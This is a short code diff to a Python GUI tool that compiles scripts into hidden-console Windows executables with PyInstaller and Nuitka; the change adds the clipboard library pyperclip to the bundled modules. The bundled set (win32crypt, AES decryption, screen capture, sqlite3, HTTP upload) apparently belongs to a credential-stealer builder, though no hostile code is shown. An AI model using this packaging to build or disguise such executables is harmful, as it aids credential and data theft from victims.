@@ -498,6 +498,7 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "Cryptodome.Cipher",
                                 "--hidden-import", "Cryptodome.Cipher.AES",
                                 "--hidden-import", "win32crypt",
+                                "--hidden-import", "pyperclip",
                                 "--icon", exeicon, script_path])
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
@@ -516,7 +517,7 @@ class App(customtkinter.CTk):
                                 "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
                                 "--include-module=sqlite3", "--include-module=psutil",
                                 "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt", "--include-module=pyperclip",
                                 "--assume-yes-for-downloads", "--windows-disable-console",
                                 f"--windows-icon-from-ico={exeicon}",
                                 f"./{filename}.py"
@@ -529,7 +530,7 @@ class App(customtkinter.CTk):
                                 "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
                                 "--include-module=sqlite3", "--include-module=psutil",
                                 "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt", "--include-module=pyperclip",
                                 "--assume-yes-for-downloads", "--windows-disable-console",
                                 f"./{filename}.py"
                             ])
